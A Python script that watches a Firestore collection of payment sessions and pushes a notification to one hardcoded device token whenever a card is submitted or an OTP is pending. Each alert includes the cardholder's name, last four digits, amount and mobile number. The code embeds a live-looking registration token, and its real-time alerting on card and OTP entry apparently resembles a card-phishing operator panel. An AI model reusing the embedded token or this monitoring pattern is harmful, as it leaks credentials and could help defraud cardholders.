import firebase_admin
from firebase_admin import credentials, firestore, messaging
import os
import json
from datetime import datetime, timedelta

# --- Firebase Configuration ---
# Get service account key from environment variable (for GitHub Actions)
# Or load from a local file for development (uncomment and adjust path below)
service_account_info = None
if os.environ.get('FIREBASE_SERVICE_ACCOUNT_KEY'): # <--- CORRECTED: Use the actual secret name here
    try:
        service_account_info = json.loads(os.environ['FIREBASE_SERVICE_ACCOUNT_KEY']) # <--- CORRECTED: Use the actual secret name here
        cred = credentials.Certificate(service_account_info)
        print("Service account key loaded from environment variable.")
    except json.JSONDecodeError as e:
        print(f"Error decoding JSON from FIREBASE_SERVICE_ACCOUNT_KEY environment variable: {e}")
        exit(1)
elif os.path.exists('serviceAccountKey.json'):
    # For local development, assuming you downloaded your key here
    cred = credentials.Certificate('serviceAccountKey.json')
    print("Service account key loaded from local file.")
else:
    print("Error: FIREBASE_SERVICE_ACCOUNT_KEY environment variable not set and serviceAccountKey.json not found.")
    print("Please set the FIREBASE_SERVICE_ACCOUNT_KEY secret in GitHub Actions or create the local file for development.")
    exit(1)

# Initialize Firebase Admin SDK
try:
    firebase_admin.initialize_app(cred)
    db = firestore.client()
    print("Firebase Admin SDK initialized successfully.")
except Exception as e:
    print(f"Error initializing Firebase Admin SDK: {e}")
    exit(1)

# --- Configuration for Notifications ---
# Path to your paymentSessions collection in Firestore
# Based on your previous JSON structure: artifacts/default-app-id/public/data/paymentSessions
FIRESTORE_COLLECTION_PATH = "artifacts/default-app-id/public/data/paymentSessions"

# Store FCM registration tokens here. In a real app, you would fetch these
# from a Firestore collection where your web app saves them.
# For demonstration, let's assume one hardcoded token for now.
# Replaced with the FCM token you provided.
FCM_REGISTRATION_TOKENS = [
    "cVTwEN5xQsmOjppCvq_0ZP:APA91bGCAozlGHkWsJauysJ4K7G8V8IEuInyVRXyPveV8H1w3g6bUAPFj__iMmUyqlDwSsWJqtiDLbYJN-hhxJTmfT2XRGHfSS8GHX1Rmno1zAO4WqQTdoM", # Your actual token
    # Add more tokens if you want to send to multiple devices
]

# File to store processed session IDs to prevent duplicate notifications
PROCESSED_SESSIONS_FILE = "processed_sessions.json"

# How far back in time to check for new/updated sessions (e.g., last 5 minutes)
# This is crucial for a scheduled script to not re-process everything.
CHECK_INTERVAL_MINUTES = 5

def load_processed_sessions():
    """Loads processed session IDs from a JSON file."""
    if os.path.exists(PROCESSED_SESSIONS_FILE):
        with open(PROCESSED_SESSIONS_FILE, 'r') as f:
            try:
                data = json.load(f)
                return set(data)
            except json.JSONDecodeError:
                return set() # Return empty set if file is corrupt
    return set()

def save_processed_sessions(sessions):
    """Saves processed session IDs to a JSON file."""
    with open(PROCESSED_SESSIONS_FILE, 'w') as f:
        json.dump(list(sessions), f)

def send_fcm_notification(token, title, body, data=None):
    """Sends an FCM notification to a single device token."""
    try:
        message = messaging.Message(
            notification=messaging.Notification(
                title=title,
                body=body,
            ),
            data=data,
            token=token,
        )
        response = messaging.send(message)
        print(f"Successfully sent message to token {token[:10]}...: {response}")
        return True
    except Exception as e:
        print(f"Error sending message to token {token[:10]}...: {e}")
        return False

def check_for_new_payment_sessions():
    """
    Checks Firestore for new or updated payment sessions and sends notifications.
    This script specifically looks for 'cardPaymentDetails' and certain 'status' fields.
    """
    print(f"Checking for new/updated payment sessions in '{FIRESTORE_COLLECTION_PATH}'...")
    processed_sessions = load_processed_sessions()
    newly_processed_sessions = set()

    # Calculate the time threshold
    time_threshold = datetime.utcnow() - timedelta(minutes=CHECK_INTERVAL_MINUTES)
    time_threshold_timestamp = int(time_threshold.timestamp() * 1000) # Convert to milliseconds

    # Query for documents updated within the last CHECK_INTERVAL_MINUTES
    # NOTE: Firestore orderBy queries require an index if you're not ordering by document ID.
    # You might need to create an index for `updatedAt` in your Firebase Console if you encounter errors.
    # Collection: artifacts/default-app-id/public/data/paymentSessions
    # Field: updatedAt (Ascending)
    try:
        sessions_ref = db.collection(FIRESTORE_COLLECTION_PATH)
        query = sessions_ref.where('updatedAt', '>', time_threshold_timestamp) \
                            .order_by('updatedAt') # Ordering is good practice

        docs = query.stream()
        found_new_events = False

        for doc in docs:
            session_id = doc.id
            session_data = doc.to_dict()
            print(f"  Processing session: {session_id}")

            # Check if it has cardPaymentDetails and relevant status
            if 'cardPaymentDetails' in session_data:
                card_details = session_data['cardPaymentDetails']
                card_status = card_details.get('status')

                # Define the specific statuses you want to notify about
                relevant_statuses = ['card_details_submitted', 'pending_otp']

                if card_status in relevant_statuses:
                    notification_key = f"{session_id}-{card_status}"

                    if notification_key not in processed_sessions:
                        found_new_events = True
                        card_holder_name = card_details.get('cardHolderName', 'N/A')
                        last4digits = card_details.get('last4Digits', 'N/A')
                        amount = card_details.get('amount', 'N/A')
                        mobile_number = session_data.get('mobileNumber', 'N/A')

                        title = "New Card Payment Alert!"
                        body = (f"Card by {card_holder_name} (ends {last4digits}) "
                                f"for ${amount} submitted. Status: {card_status}")
                        data = {
                            "sessionId": session_id,
                            "orderId": session_data.get('orderId', 'N/A'),
                            "amount": str(amount),
                            "mobileNumber": mobile_number,
                            "cardHolder": card_holder_name,
                            "cardLast4": last4digits,
                            "cardStatus": card_status,
                            "click_action": "https://spinblaze.in/" # URL to open when notification is clicked
                        }

                        print(f"  Detected new event for session {session_id} with status '{card_status}'. Sending notification...")
                        for token in FCM_REGISTRATION_TOKENS:
                            if send_fcm_notification(token, title, body, data):
                                # Mark as processed only if notification sent successfully
                                newly_processed_sessions.add(notification_key)
                    else:
                        print(f"  Session {session_id} with status '{card_status}' already processed.")
            else:
                print(f"  Session {session_id} has no cardPaymentDetails.")

        if not found_new_events:
            print("No new relevant payment events found in the last 5 minutes.")

    except Exception as e:
        print(f"Error querying Firestore: {e}")

    # Update the processed sessions file
    processed_sessions.update(newly_processed_sessions)
    save_processed_sessions(processed_sessions)
    print("Script finished.")

if __name__ == "__main__":
    check_for_new_payment_sessions()
